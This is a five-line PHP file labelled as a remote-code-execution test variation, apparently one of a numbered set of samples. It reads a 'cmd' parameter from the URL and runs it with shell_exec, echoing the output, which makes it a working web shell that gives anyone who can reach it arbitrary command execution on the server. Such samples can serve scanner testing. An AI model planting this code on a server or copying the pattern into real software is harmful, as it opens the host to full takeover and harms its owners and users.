<?php
// RCE test variation #490
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>